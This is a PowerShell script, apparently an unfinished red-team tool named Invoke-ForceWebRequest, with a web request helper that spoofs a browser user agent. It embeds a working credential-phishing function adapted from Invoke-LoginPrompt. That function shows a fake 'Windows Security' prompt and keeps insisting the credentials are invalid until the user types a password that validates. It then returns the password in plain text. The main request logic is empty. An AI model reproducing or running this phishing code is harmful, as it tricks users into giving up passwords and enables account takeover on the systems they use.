#requires -version 2
function Invoke-ForceWebRequest {
    <#

    .SYNOPSIS

    .PARAMETER Iterate

    .OUTPUTS
    
    .EXAMPLE

    #>
    [CmdletBinding()]
    [OutputType([psobject])]
    param(
        [Parameter(Mandatory=$true)]
        [String]
        $URL,

        [Parameter(Mandatory=$true)]
        [String]
        $DummyURL,

        [Parameter(Mandatory=$true)]
        [String]
        $DummyString = 'dummystring'
    )
    begin {
        # Modified version of 'Invoke-LoginPrompt' by @enigma0x3
        # https://github.com/enigma0x3/Invoke-LoginPrompt/blob/master/Invoke-LoginPrompt.ps1
        function Invoke-LoginPrompt{
            do {
                $cred = $Host.ui.PromptForCredential("Windows Security", "Invalid Credentials, Please try again", "$env:userdomain\$env:username","")
                $username = "$env:username"
                $domain = "$env:userdomain"
                $full = "$domain" + "\" + "$username"
                $password = $cred.GetNetworkCredential().password
                Add-Type -assemblyname System.DirectoryServices.AccountManagement
                $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
            } while($DS.ValidateCredentials("$full", "$password") -ne $True);
            
            $output = $cred.GetNetworkCredential() | select-object UserName, Domain, Password
            $output
        }

        # Invoke-BasicWebRequest by @daniel0x00
        #
        function Invoke-BasicWebRequest {
            [CmdletBinding()]
            [OutputType([psobject])]
            param(
                [Parameter(Mandatory=$true,
                        ValueFromPipelineByPropertyName=$true,
                        Position=0)]
                [ValidateNotNullOrEmpty()]
                [String]
                $URL,

                [Parameter(Mandatory=$false)]
                [String]
                $UserAgent = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko'
            )

            $request = [System.Net.WebRequest]::Create($URL)
            $request.UserAgent = $UserAgent
            $request.Accept = "*/*"
            try {
                $response               = $request.GetResponse()
                $response_stream        = $response.GetResponseStream();
                $response_stream_reader = New-Object System.IO.StreamReader $response_stream;
                $response_text          = $response_stream_reader.ReadToEnd(); 
                $response_status_code   = ($response.StatusCode) -as [int]

                $out = New-Object -TypeName PSObject
                $out | Add-Member -MemberType NoteProperty -Name StatusCode -Value $response_status_code
                $out | Add-Member -MemberType NoteProperty -Name Content -Value $response_text
                $out
            }
            catch {
                $response = $_.Exception.Response
                $response_status_code = [int](([regex]::Match($_.Exception.InnerException,"\b\d{3}\b")).value)

                $out = New-Object -TypeName PSObject
                $out | Add-Member -MemberType NoteProperty -Name StatusCode -Value $response_status_code
                $out | Add-Member -MemberType NoteProperty -Name Content -Value $null
                $out
            }
        }
    }
    process {
        # 1: trying to download dummystring with classic webrequest
        

    }
    end { }
}